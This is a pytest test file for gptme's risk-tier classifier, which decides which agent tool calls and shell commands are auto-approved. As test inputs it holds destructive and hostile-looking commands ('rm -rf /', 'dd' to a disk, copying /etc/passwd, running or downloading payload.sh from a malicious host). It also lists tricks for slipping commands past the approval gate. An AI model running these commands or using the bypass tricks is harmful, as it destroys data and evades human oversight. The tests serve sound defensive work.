"""Tests for tool risk tier classification."""

import pytest

from gptme.tools.base import ToolUse
from gptme.tools.risk import RiskTier, classify_tool_risk


def _tu(tool: str, content: str = "") -> ToolUse:
    """Helper to build a minimal ToolUse for testing."""
    return ToolUse(tool=tool, args=[], content=content)


# ── READ-tier tools ────────────────────────────────────────────────────────────


def test_read_tool_is_tier1() -> None:
    assert classify_tool_risk(_tu("read", "/etc/hostname")) == RiskTier.READ


def test_web_search_is_tier1() -> None:
    assert classify_tool_risk(_tu("web_search", "gptme docs")) == RiskTier.READ


def test_vision_is_tier1() -> None:
    assert classify_tool_risk(_tu("vision")) == RiskTier.READ


def test_rag_is_tier1() -> None:
    assert classify_tool_risk(_tu("rag", "search query")) == RiskTier.READ


# ── READ-tier shell commands ────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/hosts",
        "head -20 README.md",
        "tail -5 logs/app.log",
        "ls -la /tmp",
        "echo hello",
        "grep -r 'TODO' src/",
        "rg 'class Foo' .",
        "diff a.py b.py",
        "find . -name '*.py'",
        "wc -l src/*.py",
        "git status",
        "git log --oneline -5",
        "git diff HEAD",
        "git branch -a",
        "gh issue list --repo owner/repo",
        "gh pr view 123",
        "stat myfile.txt",
        "which python3",
        "pwd",
        "df -h",
        "ps aux",
    ],
)
def test_shell_safe_reads_are_tier1(cmd: str) -> None:
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for: {cmd!r}"
    )


# ── WRITE-tier tools ───────────────────────────────────────────────────────────


def test_write_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("write", "new content")) == RiskTier.WRITE


def test_patch_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("patch", "+added line")) == RiskTier.WRITE


def test_save_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("save", "content")) == RiskTier.WRITE


def test_append_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("append", "more content")) == RiskTier.WRITE


def test_python_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("python", "x = 1 + 2")) == RiskTier.WRITE


@pytest.mark.parametrize(
    "cmd",
    [
        "mkdir -p /tmp/mydir",
        "touch /tmp/newfile",
        "cp src.txt dst.txt",
        "mv old.txt new.txt",
        "pip install --user requests",
        "git add .",
        "git commit -m 'fix'",
        "npm install",
        "sed -i 's/old/new/' file.txt",
    ],
)
def test_shell_write_ops_are_tier2(cmd: str) -> None:
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.WRITE, (
        f"Expected WRITE for: {cmd!r}"
    )


# ── DESTRUCTIVE-tier tools ─────────────────────────────────────────────────────


def test_computer_tool_is_tier3() -> None:
    assert classify_tool_risk(_tu("computer")) == RiskTier.DESTRUCTIVE


def test_tmux_tool_is_tier3() -> None:
    assert classify_tool_risk(_tu("tmux", "rm -rf /")) == RiskTier.DESTRUCTIVE


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /tmp/important",
        "rm -f locked.txt",
        "git push origin master",
        "git push --force",
        "sudo apt install python3",
        "dd if=/dev/zero of=/dev/sda",
        "sudo rm -rf /",
        "curl -X POST https://api.example.com/data -d '{}'",
        "curl --data 'key=value' https://example.com/submit",
    ],
)
def test_shell_destructive_ops_are_tier3(cmd: str) -> None:
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.DESTRUCTIVE, (
        f"Expected DESTRUCTIVE for: {cmd!r}"
    )


# ── Redirection / chaining bypass prevention (Greptile finding) ───────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/passwd > /tmp/stolen",  # safe prefix, write redirect
        "echo hello > /tmp/out",  # echo with redirect
        "cat file >> /tmp/log",  # append redirect
        "grep pattern src/ > /tmp/results",  # grep with redirect
        "ls | tee /tmp/listing",  # pipe to tee (writes file)
        "cat file | tee -a /tmp/log",  # tee append
    ],
)
def test_shell_redirect_or_pipe_write_is_not_tier1(cmd: str) -> None:
    """Commands with write redirections or pipe-to-write must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for redirect/pipe-write: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "grep foo | head -10",  # safe pipe chain
        "cat file | wc -l",  # safe pipe chain
        "git log | grep pattern",  # safe pipe chain
        "ls | grep pattern",  # safe pipe chain
    ],
)
def test_shell_safe_pipe_chains_are_tier1(cmd: str) -> None:
    """Piped chains where every part is safe should still be READ."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for safe pipe chain: {cmd!r}"
    )


# ── find with mutating actions (Greptile finding) ─────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "find . -delete",
        "find /tmp -name '*.tmp' -delete",
        "find . -exec rm {} +",
        "find . -exec touch /tmp/created {} +",
        "find . -execdir chmod 777 {} \\;",
        "find . -ok rm {} \\;",
        "find . -okdir mv {} /backup \\;",
        "find . -name '*.log' -fls /tmp/listing.txt",
        "find . -fprint /tmp/files.txt",
        "find . -fprint0 /tmp/files.txt",
    ],
)
def test_find_mutating_flags_are_not_tier1(cmd: str) -> None:
    """find commands with state-changing actions must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for mutating find: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "TMPDIR=/tmp find . -delete",  # env prefix hides the mutating find
        "DEBUG=1 find . -exec rm {} +",  # env prefix + exec
        "FOO=bar find /tmp -name '*.tmp' -execdir chmod 777 {} \\;",  # env prefix + execdir
    ],
)
def test_env_prefixed_mutating_find_is_not_tier1(cmd: str) -> None:
    """find with env-var prefix and mutating flags must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for env-prefixed mutating find: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "find . -name '*.py'",
        "find . -type f -name '*.log'",
        "find /tmp -maxdepth 2 -newer ref.txt",
        "find . -name '*.py' -print",
        "find . -ls",
    ],
)
def test_find_read_only_flags_are_tier1(cmd: str) -> None:
    """Plain find queries without mutating actions remain READ-tier."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for read-only find: {cmd!r}"
    )


# ── Command substitution bypass prevention (Greptile finding) ─────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "echo $(touch /tmp/created)",  # safe prefix hides nested state-change
        "echo `touch /tmp/created`",  # backtick variant
        "cat $(rm -f /tmp/important)",  # cat prefix, destructive subst
        "ls $(mkdir /tmp/newdir)",  # ls prefix, write subst
        "echo $(curl -X POST https://api.example.com)",  # echo prefix, network write
        "grep foo $(bash /tmp/payload.sh)",  # grep prefix, arbitrary command
    ],
)
def test_shell_cmd_substitution_is_not_tier1(cmd: str) -> None:
    """Commands with $() or backtick substitution must not be auto-approved as READ."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for command substitution: {cmd!r}"
    )


# ── Edge cases ─────────────────────────────────────────────────────────────────


def test_git_push_in_multiline_script_is_tier3() -> None:
    """A script that does a read then a git push should be DESTRUCTIVE."""
    cmd = "git status\ngit push origin master"
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.DESTRUCTIVE


def test_rm_without_force_flag_is_write() -> None:
    """Plain 'rm file.txt' (no -f or -r) is WRITE, not DESTRUCTIVE."""
    cmd = "rm /tmp/tempfile.txt"
    # rm without -f or -r is reversible (trash) in many setups; tier it as WRITE
    result = classify_tool_risk(_tu("shell", cmd))
    assert result in (RiskTier.WRITE, RiskTier.DESTRUCTIVE)  # acceptable either way


def test_sed_without_inplace_is_tier1() -> None:
    """sed without -i should be read-only (prints to stdout)."""
    cmd = "sed 's/old/new/' file.txt"
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ


def test_sed_with_inplace_is_write() -> None:
    """sed -i modifies files in-place — should not be READ."""
    cmd = "sed -i 's/old/new/' file.txt"
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE


def test_unknown_tool_defaults_to_write() -> None:
    assert classify_tool_risk(_tu("mystery_tool", "content")) == RiskTier.WRITE


def test_browser_navigation_is_tier1() -> None:
    assert classify_tool_risk(_tu("browser", "https://docs.gptme.org")) == RiskTier.READ


def test_browser_form_submit_is_tier2() -> None:
    assert classify_tool_risk(_tu("browser", "click submit button")) == RiskTier.WRITE


# ── Greptile security findings — regression tests ─────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "command ls",  # command builtin runs arbitrary executables
        "command rm -rf /tmp/important",  # command + destructive
        "command bash /tmp/payload.sh",  # command + arbitrary script
    ],
)
def test_command_builtin_arbitrary_exec_is_not_tier1(cmd: str) -> None:
    """'command <executable>' is not safe — only 'command -v' (existence check) is."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for command-builtin bypass: {cmd!r}"
    )


def test_command_v_is_tier1() -> None:
    """'command -v <name>' is a pure existence check — safe READ."""
    assert classify_tool_risk(_tu("shell", "command -v python3")) == RiskTier.READ


@pytest.mark.parametrize(
    "cmd",
    [
        "python3 -c 'print(open(\"/etc/passwd\").read())'",  # reads file via print arg
        'python3 -c \'print(open("/tmp/evil", "w").write("x"))\'',  # writes via arg
        "python -c 'print(os.system(\"rm -rf /tmp\"))'",  # os.system via print arg
    ],
)
def test_python_c_print_bypass_is_not_tier1(cmd: str) -> None:
    """'python -c print(...)' can have side-effecting args — not safe to auto-approve."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for python -c print bypass: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "wget -q https://example.com/file.tar.gz",  # downloads and saves to disk
        "wget -q https://malicious.example.com/payload.sh",  # saves payload
        "wget -q https://example.com/data.json",  # writes file
    ],
)
def test_wget_q_file_download_is_not_tier1(cmd: str) -> None:
    """wget -q still writes downloaded content to disk — not a READ-only operation."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for wget file download: {cmd!r}"


# ── RiskTier ordering ──────────────────────────────────────────────────────────


def test_risk_tiers_are_ordered() -> None:
    assert RiskTier.READ < RiskTier.WRITE < RiskTier.DESTRUCTIVE


def test_risk_tier_comparison_with_int() -> None:
    """The _AUTO_APPROVE_TIER_MAX constant (int) must compare correctly."""
    assert RiskTier.READ <= 1
    assert RiskTier.WRITE > 1
    assert RiskTier.DESTRUCTIVE > 1
